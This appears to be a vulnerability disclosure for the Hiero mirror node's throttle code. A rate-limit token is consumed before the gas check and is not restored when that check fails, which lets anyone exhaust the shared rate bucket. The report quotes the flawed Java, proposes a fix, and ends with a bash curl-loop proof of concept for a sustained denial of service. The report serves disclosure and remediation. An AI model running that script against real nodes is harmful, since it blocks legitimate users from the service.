### Title
Rate Token Consumed Before Gas Check With No Rollback Enables Rate-Bucket Exhaustion DoS

### Summary
In `ThrottleManagerImpl.throttle()`, a rate token is unconditionally consumed from `rateLimitBucket` before the gas check against `gasLimitBucket` is performed. If the gas check fails, the already-consumed rate token is never restored. An unprivileged attacker can exploit this ordering to drain the `rateLimitBucket` by sending requests whose gas values exceed the remaining gas-bucket capacity, causing all subsequent legitimate requests to be rejected with "Requests per second rate limit exceeded."

### Finding Description
**Exact code path:**

`web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java`, lines 38–42:

```java
if (!rateLimitBucket.tryConsume(1)) {                                          // L38 – rate token consumed
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {  // L40 – gas check
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);               // L41 – rate token NOT restored
}
``` [1](#0-0) 

**Root cause:** `rateLimitBucket.tryConsume(1)` is called first and, on success, permanently removes one token. There is no compensating `rateLimitBucket.addTokens(1)` call in the gas-failure branch. The only restoration path is `restore(long gas)`, which exclusively refills `gasLimitBucket` and ignores `rateLimitBucket`. [2](#0-1) 

**Gas scaling:**

```java
public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) { return 0L; }   // GAS_SCALE_FACTOR = 10_000
    return Math.floorDiv(gas, GAS_SCALE_FACTOR);
}
``` [3](#0-2) 

Default `gasPerSecond = 7_500_000_000`, so `getGasPerSecond()` = `scaleGas(7_500_000_000)` = **750,000 tokens** — the gas bucket capacity. [4](#0-3) 

Default `requestsPerSecond = 500` — the rate bucket capacity. [5](#0-4) 

**Exploit flow:**

1. Attacker sends requests with `gas = 30_000_000` (a realistic Ethereum gas limit). `scaleGas(30_000_000)` = 3,000 tokens per request.
2. After ~250 such requests the gas bucket (750,000 tokens) is empty; each of those 250 requests also consumed 1 rate token (250 rate tokens spent).
3. Attacker continues sending the same requests. Each one: (a) consumes 1 rate token (succeeds), (b) fails the gas check (bucket empty), (c) rate token is **not** restored.
4. After 250 more requests the remaining 250 rate tokens are exhausted.
5. For the next ~1 second (until both buckets refill) every legitimate request receives `REQUEST_PER_SECOND_LIMIT_EXCEEDED`.
6. Attacker repeats at the start of each refill window to maintain continuous denial of service.

### Impact Explanation
Any unauthenticated caller can continuously starve the shared `rateLimitBucket`, causing all legitimate `/api/v1/contracts/call` (and related) historical Hashgraph query endpoints to return HTTP 429 "Requests per second rate limit exceeded." Because the rate bucket is global (one `Bucket` bean shared across all requests), a single attacker thread sending 500 req/s is sufficient to block all other users. The `restore()` mechanism provides no relief because it only refills gas tokens. [6](#0-5) 

### Likelihood Explanation
The endpoint is publicly reachable with no authentication required. The attacker needs only an HTTP client capable of ~500 req/s — trivially achievable from a single machine or a small botnet. The attack is fully repeatable every second as both buckets refill, making it a sustained, low-cost DoS. No special knowledge of the system internals is required; the attacker only needs to observe that high-gas requests return a gas-limit error rather than a rate-limit error, confirming the ordering.

### Recommendation
Restore the rate token when the gas check fails. Replace the current `else if` chain with explicit rollback:

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
long scaledGas = throttleProperties.scaleGas(request.getGas());
if (!gasLimitBucket.tryConsume(scaledGas)) {
    rateLimitBucket.addTokens(1);   // ← restore the rate token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, check the gas bucket first (without consuming) using `gasLimitBucket.getAvailableTokens()` before consuming from either bucket, or use bucket4j's `tryConsumeAndReturnRemaining` to make the decision atomically.

### Proof of Concept
```
# Prerequisites: default config (requestsPerSecond=500, gasPerSecond=7_500_000_000)
# Step 1 – deplete gas bucket (250 requests × 3000 scaled tokens = 750,000)
for i in $(seq 1 250); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"gas":30000000,"to":"0x...","data":"0x"}' &
done
wait

# Step 2 – drain remaining rate tokens (250 requests, each fails gas check
#           but still consumes a rate token)
for i in $(seq 1 250); do
  curl -s -X POST http://<mirror-node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"gas":30000000,"to":"0x...","data":"0x"}' &
done
wait

# Step 3 – legitimate user request now receives:
# {"_status":{"messages":[{"message":"Requests per second rate limit exceeded"}]}}
curl -X POST http://<mirror-node>/api/v1/contracts/call \
  -H 'Content-Type: application/json' \
  -d '{"gas":21000,"to":"0x...","data":"0x"}'

# Repeat steps 1-3 every second to maintain continuous DoS.
```
